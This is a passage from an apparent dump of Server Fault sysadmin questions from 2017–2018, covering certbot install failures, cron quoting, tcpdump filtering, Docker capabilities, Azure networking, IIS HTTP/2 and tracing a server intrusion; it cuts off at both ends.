---&gt; Package tk.x86_64 1:8.5.7-5.el6 will be installed
--&gt; Processing Conflict: python-devel-2.6.6-66.el6_8.x86_64 conflicts python &lt; 2.6.6-66.el6_8
--&gt; Finished Dependency Resolution
Error: python-devel conflicts with python-2.6.6-52.el6.x86_64
 You could try using --skip-broken to work around the problem
** Found 164 pre-existing rpmdb problem(s), 'yum check' output follows:
ConsoleKit-0.4.1-6.el6.x86_64 is a duplicate with ConsoleKit-0.4.1-3.el6.x86_64
ConsoleKit-libs-0.4.1-6.el6.x86_64 is a duplicate with ConsoleKit-libs-0.4.1-3.el6.x86_64
alsa-lib-1.1.0-4.el6.x86_64 is a duplicate with alsa-lib-1.0.22-3.el6.x86_64
...
yum-3.2.29-75.el6.centos.noarch is a duplicate with yum-3.2.29-60.el6.centos.noarch
yum-plugin-fastestmirror-1.1.30-37.el6.noarch is a duplicate with yum-plugin-fastestmirror-1.1.30-30.el6.noarch
zip-3.0-1.el6_7.1.x86_64 is a duplicate with zip-3.0-1.el6.x86_64
Could not install OS dependencies. Aborting bootstrap!

[root@ip ~]# yum erase python-devel
...
Package(s) python-devel available, but not installed.
No Packages marked for removal

[root@ip ~]# yum erase python
...
Error: Trying to remove ""yum"", which is protected

[root@ip ~]# ./certbot-auto --skip-broken
...
Could not install OS dependencies. Aborting bootstrap!

# ./certbot-auto --no-self-upgrade
...
Could not install OS dependencies. Aborting bootstrap!
</code></pre>

<p>There doesn't appear to be any manual way to use it.</p>

<p>CentOS release 6.8 (Final)</p>
","<ssl><centos>","2017-01-06 03:22:57"
"824594","Completely rename an unix user","<p>Recently I had a hack try on my server and someone from this forum gave me some solutions to protect my server from hack.</p>

<p>A trick is to not use defaults users, for example pi for the raspberry. The problem is when I started to configure my server I didn't created a new user and I did all with the default user pi.</p>

<p>What I want to do is just rename the pi user. But I want that all his rights and folders (for example the home directory), and even the ssh account too.</p>

<p>Can I made it simply with the usermod command ? Nothing will be forget ?</p>

<p>Also is it possible to do it through ssh connected to the pi account ? (I will use the su command to change my identity from pi to root, but the ssh connection will still belong to the pi user, no ?)</p>
","<linux><debian><user-management><raspbian>","2017-01-06 09:55:46"
"824715","Cron unterminated quoted string","<p>I'm implementing an automatic backup feature.
I can run this command from the command line:</p>

<pre><code>aws ec2 create-snapshot --volume-id=vol-abc123 --description=backup$(date +""%d-%m-%Y"")
</code></pre>

<p>It creates a snapshot with a description like <code>backup01-01-2017</code> </p>

<p>But running this command through cron like:</p>

<pre><code>0 0 * * *    aws ec2 create-snapshot --volume-id=vol-abc123 --description=backup$(date +""%d-%m-%Y"")
</code></pre>

<p>It says:</p>

<blockquote>
  <p>/bin/sh: 1: Syntax error: Unterminated quoted string</p>
</blockquote>

<p>If I remove the  <code>$(date +""%d-%m-%Y"")</code> from the command it works again:</p>

<pre><code>0 0 * * *    aws ec2 create-snapshot --volume-id=vol-abc123 --description=backup
</code></pre>

<p>How can I make <code>$(date +""%d-%m-%Y"")</code> to work from cron?</p>
","<linux><ubuntu><cron>","2017-01-06 20:33:07"
"824722","tcpdump filter does not work, why?","<p>I have a machine which has a port connected to a monitor port on a switch. Thus, many packets from different sources and destinations are arriving at its interface. However, I cannot seem to filter based on certain IP addresses.</p>

<p>For example, I try to do this, but I see no traffic:</p>

<pre><code># tcpdump -n -nn -i p2p2 host 239.31.80.152  
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on p2p2, link-type EN10MB (Ethernet), capture size 65535 bytes
^C
0 packets captured
0 packets received by filter
0 packets dropped by kernel
</code></pre>

<p>But if I do a simple grep, I can see packets come in:</p>

<pre><code># tcpdump -n -nn -i p2p2 | grep 239.31.80.152
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on p2p2, link-type EN10MB (Ethernet), capture size 65535 bytes
20:32:26.535506 IP 10.232.4.7.41724 &gt; 239.31.80.152.10502: UDP, length 38
20:32:26.635546 IP 10.232.4.7.41724 &gt; 239.31.80.152.10502: UDP, length 38
</code></pre>

<p>If I dump the packets to a pcap file, I cannot filter based on that host, either.</p>

<p>But I can filter on another host or network as I wish:</p>

<pre><code># tcpdump -n -nn -i p2p2 src net 50
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on p2p2, link-type EN10MB (Ethernet), capture size 65535 bytes
21:01:05.104011 IP 50.93.139.140.60745 &gt; 233.90.130.137.13090: UDP, length 20
21:01:05.140072 IP 50.93.139.140.60745 &gt; 233.90.130.137.13090: UDP, length 75

# tcpdump -n -nn -i p2p2 dst host 233.90.130.137
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on p2p2, link-type EN10MB (Ethernet), capture size 65535 bytes
21:01:17.940104 IP 50.93.139.140.60745 &gt; 233.90.130.137.13090: UDP, length 460
21:01:17.954007 IP 50.93.139.140.60745 &gt; 233.90.130.137.13090: UDP, length 20
21:01:18.000084 IP 50.93.139.140.60745 &gt; 233.90.130.137.13090: UDP, length 59
</code></pre>

<p>What is peculiar about that host 239.31.80.152?</p>
","<linux><networking><tcpdump>","2017-01-06 21:02:31"
"824748","Tracking server invasion","<p>I manage a private GNU/Linux server, that only I (should) have access. Over the last few months, it got invaded a few times, always by the same person (he/she runs the same application every time). This person manages to create a root account. I've changed passwords to very strong ones and deleted the created accounts, but they keep getting back in. The problem is I don't know where from.</p>

<p><strong>My question is:</strong> what are the first steps that I should do to find where my vulnerability is?</p>

<p>Some general comments about my setup:</p>

<ul>
<li><p>Debian 8.6</p></li>
<li><p>Main applications running in the server: apache, dovecot, exim, mysql and owncloud.</p></li>
<li><p>I have fail2ban running.</p></li>
<li><p>I have a script in my <code>.bashrc</code> (for my user and for root account) that warns me by email when someones opens a terminal with these accounts. It never gets triggered by the invader.</p></li>
<li><p>The output of the <code>last</code> command shows they were using a <code>tty1</code> session (whereas when I'm logged it shows <code>pts/0</code>). Also in the <code>last</code> command, in the column that should say where the access is coming from, their entry is empty.</p></li>
</ul>
","<linux><security>","2017-01-07 00:36:33"
"824763","How to relay videos blocked by firewall on client side?","<p>We have embedded Vimeo videos on a site accesible only to logged in users. Because of different firewalls, using different types of blocks, the videos sometimes do not work for the client.</p>

<p>We cannot:</p>

<ul>
<li>know which kind of block the videos trigger on these firewalls</li>
<li>ask the clients to change any settings on their browsers</li>
<li>ask the clients to request a change to firewall settings
settings</li>
</ul>

<p>For cases where the firewall blocks Vimeo explicitly, as opposed to blocking all video streaming, we would like to do the following:</p>

<ul>
<li>our application detects Vimeo is being blocked</li>
<li>tells the browser to load up a different player</li>
<li>this new player loads every needed resource (video, JS, json, etc) from domains that we control (and thus have valid SSL certificates for), instead of Vimeo/Akamai domains.</li>
</ul>

<p>The actual video, which will also be loaded from a domain we control, will be fetched from Vimeo to our server and then served from our server to the client. Everything is over SSL, but this is not MITM, as the client will be requesting the video stream, along with the other needed resources for the player, from our domains.</p>

<p>Could this be called a transparent proxy? More importantly, <strong>can we accomplish the above using Squid</strong>? <strong>If not Squid, how would we accomplish this</strong>? We do not want to store the video anywhere else but on Vimeo, but we are ok with caching the videos for a couple hours on our servers.</p>
","<proxy><squid><transparent-proxy><video-streaming><man-in-the-middle>","2017-01-07 04:50:14"
"895614","How to enable/install kernel-debuginfo linux-4.14.14 on amzn-linux?","<p>I'm on an amzn-linux instance which by default runs linux-4.9. I've compiled and booted linux-4.14.14 from source and I've compiled systemtap from source. Now I'd like to get them both working nicely together. Systemtap requires linux-debuginfo package. I'm running into a myriad of issues just trying to enable this or get it installed:</p>

<ul>
<li>amzn-main-debuginfo yum repo only provides kernel-debuginfo-4.9</li>
<li>I cannot find a kernel-debuginfo-4.14.14 package</li>
<li>i cannot find kernel-debuginfo-4.14.14 source code so I can compile it from scratch</li>
<li>I cannot find a CONFIG_DEBUG_INFO option for <code>make menuconfig</code> for linux-4.14.14</li>
<li>if I manually add CONFIG_DEBUG_INFO=y to linux-4.14.14/.config it gets deleted before compilation</li>
</ul>

<p>If there's any way to fix any one of the above things, I think I can get this to work.</p>
","<linux-kernel><debugging>","2018-02-04 17:54:25"
"824805","Is it possible to find the distance between two networked devices?","<p>Is it possible to find out how far away another device, within the same network, is from my computer? Are there any programs that can do this?</p>

<p>I decided to use the formula <code>distance = speed * time</code>, where time would be the minimum rtt of the <code>ping</code> command and speed was <code>346m/s</code></p>

<p>The <code>ping</code> command doesn't seem to always be accurate and sometimes gives varying results. Sometimes the ping time is <code>30ms</code>, then <code>1ms</code> and then <code>50ms</code>. Using <code>ping</code> on my computer, I get more accurate results that using my phone, which often gives a few 100 milliseconds.</p>

<p><code>346m/s</code> comes from the speed of sound in air at a temperature of 25°C. I'm not sure if that is the correct speed that I should be using. The speed also doesn't account for all the obstacles, like walls, that the information/packets have to travel through.</p>

<p>After doing a few calculations using the above formula, speed and ping time, I figured out that this method of calculating distance to another device on the same network doesn't work.</p>

<p>Does anybody have any ideas on how this could be done?</p>
","<networking>","2017-01-07 11:24:37"
"824809","Chrome under Docker: CAP_SYS_ADMIN vs privileged?","<p>I am running chromedriver + chrome inside Docker in my test environment.</p>

<p>Everything was working fine until latest CoreOS upgrade.</p>

<p>These are the versions that seem to work:</p>

<pre><code>VERSION=1185.5.0
VERSION_ID=1185.5.0
BUILD_ID=2016-12-07-0937
</code></pre>

<p>And this a newer version that causes chrome to coredump:</p>

<pre><code>VERSION=1235.4.0
VERSION_ID=1235.4.0
BUILD_ID=2017-01-04-0450
</code></pre>

<p>Looking at changes, it seems docker was upgraded from 1.11.x to 1.12.x, which broke <code>setns()</code> call inside container. <code>setns()</code> is used by Chrome for creating a namespaces. </p>

<p>This are the example outputs:</p>

<pre><code>jsosic-coreos-test-20161207 ~ # docker --version
Docker version 1.11.2, build bac3bae
</code></pre>

<p>From inside one container on this box:</p>

<pre><code>[root@2939f21ecfaa /]# /opt/google/chrome/google-chrome
[57:57:0107/015130:ERROR:browser_main_loop.cc(261)] Gtk: cannot open display:
</code></pre>

<p>This is how the new version broke it:</p>

<pre><code>jsosic-coreos-test-2017-01-04 ~ # docker --version
Docker version 1.12.3, build 34a2ead

[root@13ab34c36c82 /]# /opt/google/chrome/chrome
Failed to move to new namespace: PID namespaces supported,
  Network namespace supported,
  but failed: errno = Operation not permitted
Aborted (core dumped)
</code></pre>

<p>What I have found out is that if I start the container with either <code>--cap-add=SYS_ADMIN</code> or <code>--privileged</code> - Chrome works as expected.</p>

<p>What is the difference between those two switches? What capabilities are enabled by <code>--privileged</code>? </p>

<p>And, can I allow <code>setns()</code> inside container without compromising security?</p>
","<permissions><docker><chrome><namespaces>","2017-01-07 13:13:22"
"825057","azure port forwarding not working","<p>I have a Debian 6.x box that I needed to move to Azure.  Before moving it up, I did make sure that SSH is listening on any port, so is Apache.  My NSG has all of the right ports opened (22, 443 for now). I uploaded the VHD, then used the following PowerShell commands to create the VM based off of the VHD:</p>

<pre><code>$vnet = get-AzureRmVirtualNetwork -Name $VnetName -ResourceGroupName $VnetRG
$subnet = Get-AzureRmVirtualNetworkSubnetConfig -Name ""$SubnetName"" -VirtualNetwork $vnet
$pip = Get-AzureRmPublicIpAddress -Name ""$pipName"" -ResourceGroupName $resourceGroupName
$NSG = Get-AzureRmNetworkSecurityGroup -Name ""$NSGName"" -ResourceGroupName $resourceGroupName
$nic = New-AzureRmNetworkInterface -ResourceGroupName $resourceGroupName -Name $nicName -Subnet $subnet -Location $location -PrivateIpAddress $newVMIP -DnsServer $dnsServer1,$dnsServer2 -PublicIpAddress $pip -NetworkSecurityGroup $NSG
$newVM = New-AzureRmVMConfig -VMName $newVMName -VMSize $newVMSize | Add-AzureRmVMNetworkInterface -Id $nic.Id | Set-AzureRmVMOSDisk -VhdUri $vhdPath -Name $diskname -CreateOption attach -Linux -Caching ReadWrite
New-AzureRMVM -ResourceGroupName $resourceGroupName -Location $location -VM $newVM -DisableBginfoExtension
</code></pre>

<p>I can see that the machine is running as I can view the auto-logged-in desktop in boot diagnostics.  However, when I try to SSH or when I try to access the web site over 22 and 443, it's not returning any response.  Telnet times out and it's acting like the port isn't forwarding at all.</p>

<p>I understand that because it's Debian 6.x, waagent isn't supported.  But I shouldn't need waagent for port forwarding, should I?  From what I understand about networking and from what I see in MSDN forums, ""The port forwarding should be invisible to your end machine.  As the public hits the public port and your VM receives on the internal port."" (<a href=""https://social.msdn.microsoft.com/Forums/en-US/bd93f5cb-a674-4b9c-aa5a-9f6e7b364f2c/port-forwarding-still-broken?forum=WAVirtualMachinesforWindows"" rel=""nofollow noreferrer"">https://social.msdn.microsoft.com/Forums/en-US/bd93f5cb-a674-4b9c-aa5a-9f6e7b364f2c/port-forwarding-still-broken?forum=WAVirtualMachinesforWindows</a>)  </p>

<p>Did I mis-key or miss something in my PowerShell script?  Any ideas?  </p>

<p>I have tried deleting and re-creating the VM and I've tried re-uploading the VHD file.  I did have to convert it from VHDX to VHD, but that shouldn't matter since it's actually booting up and I see the screen in boot diags.</p>

<p>The NSG I used does work for any other newly created machine via portal or PowerShell, just not this uploaded machine, which makes me think I've flubbed something in the script.  Everything does show that it's open for port 22 and 443 though.  Here's a screen grab of the Effective Security Rules blade:
<a href=""https://i.sstatic.net/kZhDD.png"" rel=""nofollow noreferrer"">screenshot</a></p>
","<linux><powershell><azure>","2017-01-08 21:19:33"
"825192","Email to AOL from Bluehost.com","<p>I have a domain hosted at Bluehost.com, and email forwards are not making it to aol.com users. DNS and MX records are configured per Bluehost's instructions. </p>

<p>Bluehost has assigned me an IP Address. I have an A record email.[domain].com pointing to the assigned IP address. </p>

<p>Forwarding works to other domains. </p>
","<domain-name-system><email><mx-record><mail-forwarding>","2017-01-09 23:02:10"
"825696","Is there a way to set Outlook 2016 / Office 365 to only send out away messages during certain times of the day","<p>I have an office 365 account and I was trying to find a way to make it so I can send out replies only during certain hours of the day without always having to manually change it.</p>

<p>Working half days now and would like to let clients know who email me directly where to contact for support and more. </p>
","<microsoft-office-365><outlook-2016>","2017-01-11 21:14:21"
"895750","Detecting changes in share permissions","<p>I was wondering if there's a way to detect changes in share permissions apart from enabling auditing, something that would show you what was there before and what has been changed.</p>

<p>This would be useful if by mistake you edit the permissions at the root share and instead of adding you accidentally click on Yes at the pop-up to replace them.</p>

<p>How would you know what permissions you replaced, for restore purposes, if the share is rather big?</p>
","<network-share>","2018-02-05 18:32:10"
"825838","AWS route53 second level SSL cert wildcard","<p>I use aws route53 with a wildcard SSL certificate:</p>

<p>the certificate allows: *.domain.com</p>

<p>In order to allow users to access both: ""domain.com"" and ""www.domain.com"" I have to setup individual records for each. This does not bother me, but I have a problem when I want to use subdomains:</p>

<pre><code>domain.com
www.domain.com
sub.domain.com
</code></pre>

<p>all work since they match *.domain.com  ... However I also want www.sub.domain.com to work without having to add *.sub.domain.com to the certificate.</p>

<p>How is it possible?</p>
","<amazon-web-services><ssl-certificate><amazon-route53>","2017-01-12 12:11:11"
"895889","How can I chain a tty over multiple ssh hops","<p>I have a target-server that is accessible by middle-server, and I want a terminal from my localhost to target-server, through middle-server.</p>

<p>No need to open a port in my localhost.</p>
","<ssh><tty>","2018-02-06 13:57:29"
"825966","How to fix Padding Oracle vulnerability on CentOS 7","<p>I have set up a test web server on CentOS 7 to find a way to fix Padding Oracle vulnerability, which I got when I scanned our production site on ssllabs.com. On the test server, I installed openssl(1.0.2j, which is latest as of 1/12/2017) and apache(2.4.25, which is also latest as of 1/12/2017) from source and made some basic changes to apache configuration such as SSL. After making sure SSL works by accessing it with a web browser, I scanned the test site on ssllabs.com, which told me that it still had the same vulnerability. I thought the test site would pass it because the bug was already fixed at the release of 1.0.2h according to the Openssl official site. I have no idea what else to try next. Any advice would be appreciated.</p>

<p>I think the apache uses the openssl I installed instead of the other one (1.0.1e), which is built in on CentOS7. Below is one of what I did to make sure of that.</p>

<p><em>Under the condition of ServerTokens Full</em></p>

<pre><code>[root@*** ~]# curl --head http://***.*********.com
HTTP/1.1 200 OK
Date: Thu, 12 Jan 2017 19:52:31 GMT
Server: Apache/2.4.25 (Unix) OpenSSL/1.0.2j
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: ""2d-432a5e4a73a80"" 
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html
</code></pre>
","<apache-2.4><centos7><openssl><vulnerability>","2017-01-12 20:16:56"
"826248","Practice management software running in Hyper-V?","<p>It's my first time asking a question, so please let me know if I've done something wrong or can be more clear/concise in my phrasing.</p>

<p>I've recently taken over service for a dental office that utilizes Patterson Eaglesoft 18 as their practice management solution. To help them meet compliance, we moved them from a workgroup-based environment to a domain-based system. In the process, we setup a virtual domain controller and also virtualized their installation of Eaglesoft Server 18. This was all done on a custom built machine, using Windows Server 2012 R2 as both the host and virtual OS's.</p>

<p>After the setup was complete, most aspects of the software functioned normally without any issue. However, the client systems have trouble performing very specific database operations. In particular, they're unable to consistently display medical history information for patients. Data can be committed from the workstation, but the information will not populate in the form when loading the patient information.</p>

<p>After working with the software vendor for an extended period of time, their answer was to run the Server software on the host machine as they don't offer support for virtualized environments. I didn't really believe that could be the issue, but after doing as I was told, the issue was resolved.</p>

<p>I've started over twice with clean installations of Windows Server 2012R2 on multiple Hyper-V VM's and have run into the same issue consistently. The only way to make the software work properly is to run it on the host machine. If it helps at all, Eaglesoft uses Sybase as its core database engine. Can any of you think of a reason that the software wouldn't operate properly in a virtual environment? Can you think of other cases where this has happened?</p>

<p>--</p>

<p>tl;dr: Practice management software only works when run on host machine; won't work on Hyper-V system. Any thoughts?</p>
","<virtualization><domain><virtual-machines><hyper-v><sybase>","2017-01-14 05:10:40"
"826254","Building deb files for both Debian and Ubuntu","<p>While the tools are the same, the sections and distribution names are notably different between Ubuntu &amp; Debian (and presumably other Debian-based distros).</p>

<p>For example, a Lua library's debian/control file for Debian might use</p>

<pre><code> Section: contrib/libdevel
</code></pre>

<p>while Ubuntu would use</p>

<pre><code> Section: universe/interpreters
</code></pre>

<p>What is the best way to make deb files for each when ""universe"" doesn't exist in Debian and ""contrib"" doesn't exist in Ubuntu given that the tools seem to all act upon a single source/config directory: debian? How does one reconcile this?</p>

<p>Note: this question also applies to changelog entries.</p>
","<ubuntu><debian><deb>","2017-01-14 06:46:04"
"896243","No internet after installing hyper-v","<p>I did a boo boo. My home lab machine running Windows Server 2016 got reinstalled here the other day and it had internet access thru the one physical ethernet connection.</p>

<p>Then I installed Hyper-V which installed a second adapter, virtual switch, and then the Hyper-V machine host does not have internet access anymore.</p>

<p>However, my VMs does :D</p>

<p>Any clue on what I did wrong? I need internet access on both host and virtual machines.</p>
","<hyper-v><windows-server-2016>","2018-02-08 06:12:48"
"826336","HTTPS on IP address and not on domain name?","<p>It looks like HTTPS certificate for an IP address and not for domain name is possible.</p>

<p>My goal is to have an HTTPS on an IP address
ex: <a href=""https://XX.YY.WW.ZZ"" rel=""nofollow noreferrer"">https://XX.YY.WW.ZZ</a></p>

<p>However I cannot find any company that provides such service: any advice ?</p>
","<ssl><https><hosting>","2017-01-14 21:37:48"
"826372","How do I block someone else's domain pointing to my hosted website?","<p>Hi I am running my website in Linux VPS with dedicated IP few weeks ago I found someone else domain is pointing to my website</p>

<p>Ex :: mydomain.com === server my site content otherdomain.com === also server my site content If I update or modify its getting updated on other domain too..</p>

<p>please need help any settings to prevent this</p>

<p>after searching many forums I found the name based virtual host how to implement this in VPS Linux please guide me or any other solution for this issue please help</p>

<p>I also try to see the reverse IP lookup my IP shows two domain another 1 is bad domain is pointing my server/ IP but it server my site content ..how to stop this please help</p>
","<.htaccess>","2017-01-15 06:40:39"
"826916","How do you manage your server infos(IP/Name)","<p>In my company, on one know the exact server infos. An excel file is used to maintain all server lists(hostname/ip), but does not update on time.</p>

<p>Someone may create several servers but forgot to add it to excel file and sometimes later he quit the company. So no one know how many servers we have.</p>

<p>How do you manage server info? I hope there is a Web UI, so we can manage it.</p>
","<linux><networking><hostname>","2017-01-18 03:48:41"
"826926","Why do some commands require su instead of just sudo to do?","<p>I thought that running a command with <code>sudo</code> was identical to logging in as the root user and executing the command.  However I have found a few commands that do not work with <code>sudo</code> but do work for <code>su</code>.</p>

<p>For instance,</p>

<pre><code>sudo &gt; mail.log
bash: mail.log: Permission denied
</code></pre>

<p>but actually typing <code>su</code> and executing the same command works.</p>

<p>Why is this?</p>
","<bash><sudo>","2017-01-18 05:39:39"
"827021","Extending LAN ports of a wifi router","<p>I have a wifi router which has a built in LAN switch with two LAN ports. I have more than two devices which only support LAN connectivity, which I need to connect to my network.</p>

<p>Is it possible to connect a switch to one of the LAN ports of the router and connect my LAN only devices to this switch? If this is not possible, what else can I do?</p>

<p>Is only a single IP address assigned to a LAN port by the wifi router?</p>
","<wifi><local-area-network>","2017-01-18 13:38:23"
"827347","How to immediately (temporarily) install a Windows Server 2012 R2 Foundation and upgrade later to the ROK version?","<p>A friend of mine has to set up a <code>Windows</code> server box and is in a hurry – the server must be running asap. He has successfully ordered a <code>IBM System x3100 M5</code> with appropriate RAM and HDDs. However, there are difficulties in the delivery of the recommended operating system version, which is <code>IBM Windows Server 2012 R2 Foundation, ROK, 1 CPU</code> (the OS can be delivered but it will arrive a couple of days too late).</p>

<p>Because of the fact that I am a Linux guy, I am not too familiar with Microsofts licensing options and restrictions. Firstly, I am not sure if I really need IBM's ROK version for successful operation of the server (does it include important drivers that other distributions lack?). Secondly, I am not entirely sure if I could simply install an evaluation version first, and later on use the product key of the <code>IBM Windows Server 2012 R2 Foundation, ROK, 1 CPU</code> as soon as it has arrived (there seem to be only evaluation versions of the <code>Essentials/Standard/DataCenter</code>, but not for the <code>Foundation</code>). Would a <code>Windows Server 2012 R2 Essentials</code> work as well for my server? Does it include all required drivers?</p>

<p>So how should I tackle this situation? My favorite option would be to (of course legally) buy-download-burn the <code>IBM Windows Server 2012 R2 Foundation, ROK, 1 CPU</code> somewhere, but it seems that this is not offered. My second favorite alternative would be to download and burn a <code>Windows Server</code> version which can be migrated later on to the supported version. But I am a bit lost in Microsofts version and license jungle.</p>
","<windows-server-2012-r2><licensing>","2017-01-19 17:16:01"
"827362","How to exit a SSH connection in a bash script","<p>I've read several posts on here about this topic but every solution I find seems to be a one liner where you run one command.</p>

<p>I'm creating a script where I ssh to several different hosts one after a time. The goal is to ssh to a machine, do some local commands, execute a a script, wait for it to finish and then exit the ssh session and move on to the next.</p>

<p>However, when I use the ""exit"" command it does not work and just exits the script altogether.</p>
","<ssh><bash>","2017-01-19 18:26:32"
"896384","Domain & file server migration","<p>Our company has a client who is in a spot of trouble and has asked us for advice. Their support/host company has gone bust and they want to use this opportunity to upgrade their servers.
They have an older domain that they need to migrate from (Dobbde.com running server 2003) into (Dobbde123.com running 2012). They have two domain controllers in Dobbde.com (2003) and we will have two domain controllers in the new domain which run 2012.
What would be the best way to do this? Windows Migration tool?
They also want to migrate their file server from 2003 to 2012.
They have a number of mapped user drives from Group Policy under docs.Dobbde.com:
d:\ Durham, e:\ France, f:\ NZ, and  Z:\Germany 
D:\Durham has a number of user shares on it which need to be migrated one at a time: D:\Sales D:\Boats D:\AdminD:\Haulgate</p>

<p>What would be the best way to do this part of the migration? Is there a way to do this using windows migration tools?? Should we use Robocopy or a similar tool for this part of the work? 
Apologies if this is muddled, like I say the host company has gone bust and we are in a tight spot. Am I missing something?I realise this is pretty brief but any advice you can provide would be greatly appreciated.</p>

<p>o
Regards,</p>

<p>Damian Ferns</p>
","<active-directory><windows-server-2003><windows-server-2012><migration><file-server>","2018-02-08 19:39:35"
"896394","Systemd reload service from package install","<p>I am building an RPM (SLES12) package that installs a service with some software. The package dumps a new file into /etc/rsyslog.d to handle logging.</p>

<p>I would like to have the rpm basically run a ""systemctl restart rsyslog"" from the install... I guess from %post</p>

<p>Is there any specific way this should get run (like a macro) or should I just literally put that line in the scriptlet?</p>
","<systemd><sles>","2018-02-08 20:37:37"
"896491","Python script executing on server, but not in a cron","<p>I put together a python script that takes the output of a command and emails it to me every morning at 8. When running it manually, it runs fine, however when my cron runs it I receive the following:</p>

<pre><code>Traceback (most recent call last):
  File ""/root/backup-mailer.py"", line 50, in &lt;module&gt;
    backups = json.loads(subprocess.check_output(['restic', 'snapshots', '--json']))
  File ""/usr/lib64/python2.7/subprocess.py"", line 568, in check_output
    process = Popen(stdout=PIPE, *popenargs, **kwargs)
  File ""/usr/lib64/python2.7/subprocess.py"", line 711, in __init__
    errread, errwrite)
  File ""/usr/lib64/python2.7/subprocess.py"", line 1327, in _execute_child
    raise child_exception
OSError: [Errno 2] No such file or directory
</code></pre>

<p>Is it <code>/usr/lib64/python2.7/subprocess.py</code> that it's having issues with?</p>

<p>My crontab:</p>

<pre><code>0       8       *       *       *       . /root/.restic-env; /usr/bin/python /root/backup-mailer.py
</code></pre>

<p>I know <code>. /root/.restic-env;</code> runs fine because I use it in another cron which is successful. I've also ran <code>/usr/bin/python /root/backup-mailer.py</code> which executes fine. As I say, it's only when it's ran as a cron that it fails.</p>

<p>Any suggestions? Thanks</p>
","<centos><cron><python>","2018-02-09 11:08:31"
"896553","Why is IIS 10 serving content using HTTP 1.1 instead of HTTP 2?","<p>I have a base install of IIS 10 on Windows Server 2016 which I have setup my basic web application on. </p>

<p>The application website uses HTTPS.</p>

<p>For some reason, when browsing from Chrome 63, the content is served using HTTP/1.1 when I expected it to be served over HTTP/2. I have checked the IIS logs which show:</p>

<pre><code>#Software: Microsoft Internet Information Services 10.0
#Version: 1.0
#Date: 2018-02-09 16:32:34
#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs-version cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
2018-02-09 16:32:38 196.44.182.180 GET /uploaded/a87f9d27-3732-426f-80cb-ac531579a908.jpg - 443 - 196.44.177.71 HTTP/1.1 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/63.0.3239.132+Safari/537.36 https://xxxxxxx/ 200 0 0 46
</code></pre>

<p>Interestingly, when I use <a href=""https://tools.keycdn.com/http2-test"" rel=""nofollow noreferrer"">https://tools.keycdn.com/http2-test</a> to check if HTTP/2 is supported by my web application, it says ""Yeah! xxxxx supports HTTP/2.0""</p>

<p>But when I use Chrome or Lighthouse (to test) it tells me content is being served over HTTP/1.1</p>
","<iis><asp.net><google-chrome><http2>","2018-02-09 16:46:18"
"828276","cat /dev/zero | pv > /dev/null","<p><code>cat /dev/zero | pv &gt; /dev/null</code></p>

<p>What exactly happens here and what determines the speed of this process.</p>

<p>Even on low end hardware you get a couple of GB/s transfer speeds like this.</p>
","<cpu-usage><block-device><cat>","2017-01-24 13:53:27"
"828299","Have Same Data in 2 VPS","<p>I have two VPS that installed WHM on each, I want to have same data on both of them.
Now one of my VPS have data and one of them is empty.
There is any solution to i have all my data, database, emails and everything in my VPS to my another VPS, and update my second VPS when any change occurred on my VPS.</p>
","<vps><centos7><cpanel><transfer>","2017-01-24 15:12:58"
"896872","how to parse temperature data from Esxi server","<p>I need to parse temperature data from esxi servers, to db for visualization the server room stats. I have 3 servers running esxi 6.5 
    IBM System x3250 M3
    IBM IBM System x3550 M4 Server
    Dell PowerEdge R630
I tried snmp walk but i cant find temperature data. I would be great to have data at least from one server</p>
","<vmware-esxi><monitoring><dell><snmp><ibm>","2018-02-12 13:46:37"
"828450","Running Oracle DB Server on RHEL with less memory","<p>I have a VM/Hyper-V for RHEL 7 where I need to install Oracle DB Server (12.1.0.2.0) - Standard Edition (SE2) along with App server, apache, local LDAP and other products for Developer Coding</p>

<p>I want to run the Oracle with as less memory as possible, so that my VM is optimum. How to start a Oracle Server Instance with minumum memory</p>
","<redhat><oracle>","2017-01-25 06:02:20"
"828501","list of commands for nsclient++","<p>After executing the following command  get the correct result </p>

<pre><code>./check_nrpe -H @IP -p 5666 -c alias_mem
OK: committed = 6.083GB, physical = 1.608GB|'committed'=6.08327GB;12.7978;14.39752;0;15.99725....
</code></pre>

<p>The issue is that I haven't found any documentation that lists all the possible commands.. I've tried alias_cpu, alias_disk and it works but I'd like to find all the possible commands ... </p>
","<nagios><nsclient++><centreon>","2017-01-25 10:46:41"
"897041","Connection refused, I can't ssh into my server","<p>I'm not sure if my site was hacked or there's a server related error. My website was running fine ever since I published it, yesterday I visited it and it said connection refused. I informed my hosting provider and they told me to create a new database connection, when I open phpMyAdmin I get a strange error that says:</p>

<pre><code>Warning in ./libraries/plugins/auth/AuthenticationCpanel.php#629
mysqli_connect(): (HY000/2002): Can't connect to local MySQL server 
through socket '/var/lib/mysql/mysql.sock' (2)
</code></pre>

<p>When I try to ssh into my server I get the following errors:</p>

<pre><code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@       WARNING: POSSIBLE DNS SPOOFING DETECTED!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
The RSA host key for [wesocular.com]:60504 has changed,
and the key for the corresponding IP address [46.105.40.12]:60504
is unknown. This could either mean that
DNS SPOOFING is happening or the IP address for the host
and its host key have changed at the same time.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
SHA256:EvplXyAHYO4nP4rmOtJ2j3wc4O04UMUWMvLi9ZpsVuU.
Please contact your system administrator.
Add correct host key in /c/Users/Game330/.ssh/known_hosts to get rid of this mes   sage.
